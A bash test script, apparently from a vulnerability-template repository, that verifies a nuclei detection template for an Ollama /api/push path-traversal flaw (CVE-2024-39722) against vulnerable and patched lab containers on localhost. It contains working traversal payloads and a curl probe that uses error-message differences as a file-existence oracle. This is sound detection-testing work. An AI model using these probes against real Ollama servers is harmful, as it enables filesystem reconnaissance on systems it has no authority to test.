#!/usr/bin/env bash
# ollama-push-path-traversal 模板正反例门禁（CVE-2024-39722）
#
# 断言：
#   正例靶标（ollama/ollama:0.1.45，lab compose ollama-0145，127.0.0.1:18145）
#     -> nuclei 必须命中（>= 1 条结果）
#   负例靶标（ollama/ollama:0.3.14，lab compose ollama-0314，127.0.0.1:18314）
#     -> nuclei 必须零命中
#   另附靶标状态差分自检（存在性预言机断言），防靶标版本漂移导致门禁假绿。
#
# 安全说明：所有探测 payload 的 registry 段固定为不可解析域名 invalid.invalid，
# 服务端即使走到出网阶段也无法建立真实连接；探测目标仅限 Ollama 自身数据目录
# 与其内部随机不存在路径，不触碰任何敏感文件（/root/.ollama 下 id_ed25519 等）。
# 探测均为只读 stat，无状态副作用，可重复运行（幂等）。
#
# 前置：lab 靶标已启动 —— docker compose -f ~/DEV/lab/docker-compose.yml up -d
# 用法：bash scripts/verify-ollama-push-traversal.sh
# 退出码：0 = 全部通过；1 = 有断言失败。
set -u

REPO_ROOT="$(cd "$(dirname "$0")/.." && pwd)"
TEMPLATE="$REPO_ROOT/http/vulnerabilities/ollama-push-path-traversal.yaml"
POS_URL="${POS_URL:-http://127.0.0.1:18145}"
NEG_URL="${NEG_URL:-http://127.0.0.1:18314}"
EVIDENCE_DIR="${EVIDENCE_DIR:-$REPO_ROOT/tests/evidence}"

# 存在性预言机差分 payload（均 3 段形式，registry=invalid.invalid 恒定不可解析）：
#   不存在侧：清洗后 stat <models>/manifests/invalid.invalid/latest（随机不存在）
#   存在侧：  清洗后 stat /root/.ollama（Ollama 数据目录根，必然存在）
PAYLOAD_NONEXIST='invalid.invalid/library/..:latest'
PAYLOAD_EXIST='invalid.invalid/../..:..'

fail() { echo "FAIL: $*" >&2; exit 1; }
pass() { echo "PASS: $*"; }

command -v nuclei >/dev/null 2>&1 || fail "nuclei CLI 不在 PATH"
[ -f "$TEMPLATE" ] || fail "模板不存在: ${TEMPLATE}（先写模板再跑门禁）"
command -v curl >/dev/null 2>&1 || fail "curl 不在 PATH"

# 指纹预检：等待服务就绪（GET / 含 "Ollama is running"）
wait_ollama() {
    local url="$1" label="$2" i
    for i in $(seq 1 30); do
        if curl -s --max-time 3 "$url/" 2>/dev/null | grep -q "Ollama is running"; then
            return 0
        fi
        sleep 2
    done
    fail "$label 指纹不可达（GET / 未返回 Ollama is running）: $url"
}

push_probe() { # $1=url $2=payload -> stdout 为响应 body
    curl -s --max-time 10 -X POST "$1/api/push" \
        -d "{\"name\":\"$2\",\"insecure\":true,\"stream\":false}"
}

# --- 靶标状态差分自检（防版本漂移假绿） ---
check_positive_target() {
    wait_ollama "$POS_URL" "正例靶标(0.1.45)"

    local body
    body="$(push_probe "$POS_URL" "$PAYLOAD_NONEXIST")"
    echo "$body" | grep -q 'no such file or directory' \
        || fail "正例靶标[不存在侧]未回显 ENOENT stat 错误（靶标可能不是 0.1.45）: $body"
    echo "$body" | grep -q 'manifests/invalid\.invalid/latest' \
        || fail "正例靶标[不存在侧]回显路径未体现 .. 清洗（预期 manifests/invalid.invalid/latest）: $body"

    body="$(push_probe "$POS_URL" "$PAYLOAD_EXIST")"
    echo "$body" | grep -q "couldn't open file" \
        || fail "正例靶标[存在侧]错误形态与 ENOENT 无差分（预言机不成立）: $body"
    pass "正例靶标差分自检：stat ENOENT vs couldn't open，预言机行为符合 0.1.45"
}

check_negative_target() {
    wait_ollama "$NEG_URL" "负例靶标(0.3.14)"

    local body
    # 0.3.14+ 校验行为指纹：registry/namespace 级 ".." 被拒（invalid model path）。
    # 注：实测并非任务书预期的 400 "invalid model name"，而是 500 "invalid model path"；
    # model 段单级 ".." 仍被清洗回显（open 动词，残留路径泄露）。
    body="$(push_probe "$NEG_URL" "$PAYLOAD_EXIST")"
    echo "$body" | grep -q 'invalid model path' \
        || fail "负例靶标[存在侧]未返回 invalid model path（靶标可能不是 0.3.14+）: $body"

    # 预言机死证明：可过校验的遍历 payload 只能清洗到 manifests 目录内部
    # （无必然存在文件），不得出现 stat 动词或 couldn't open 差分形态。
    body="$(push_probe "$NEG_URL" "$PAYLOAD_NONEXIST")"
    echo "$body" | grep -q 'stat ' \
        && fail "负例靶标[不存在侧]出现 stat 回显（0.1.45 式行为？靶标版本漂移）: $body" || true
    echo "$body" | grep -q "couldn't open file" \
        && fail "负例靶标[不存在侧]出现 couldn't open 差分形态（预言机复活）: $body" || true
    pass "负例靶标差分自检：NS 级 .. 被拒、model 级 .. 无差分能力，符合 0.3.14+"
}

# --- nuclei 模板门禁 ---
run_nuclei() { # $1=url $2=输出文件 -> echo 命中条数
    local url="$1" out="$2"
    nuclei -t "$TEMPLATE" -u "$url" -jsonl -silent -nc -o "$out" >/dev/null 2>&1
    [ -f "$out" ] || return 0
    grep -c '^{' "$out" || true
}

mkdir -p "$EVIDENCE_DIR"

check_positive_target
check_negative_target

pos_out="$EVIDENCE_DIR/ollama-push-path-traversal-positive-0.1.45.jsonl"
neg_out="$EVIDENCE_DIR/ollama-push-path-traversal-negative-0.3.14.jsonl"
rm -f "$pos_out" "$neg_out"

pos_hits="$(run_nuclei "$POS_URL" "$pos_out")"
neg_hits="$(run_nuclei "$NEG_URL" "$neg_out")"

[ "${pos_hits:-0}" -ge 1 ] \
    || fail "正例未命中（0.1.45 必须命中），nuclei 输出: $pos_out"
pass "正例命中 ${pos_hits} 条（0.1.45）-> $pos_out"

[ "${neg_hits:-0}" -eq 0 ] \
    || fail "负例误报（0.3.14 必须零命中，实际 ${neg_hits} 条），nuclei 输出: $neg_out"
pass "负例零命中（0.3.14）-> $neg_out"

echo
echo "全部通过：模板在正例命中、负例零命中，靶标差分自检符合预期版本行为。"
exit 0
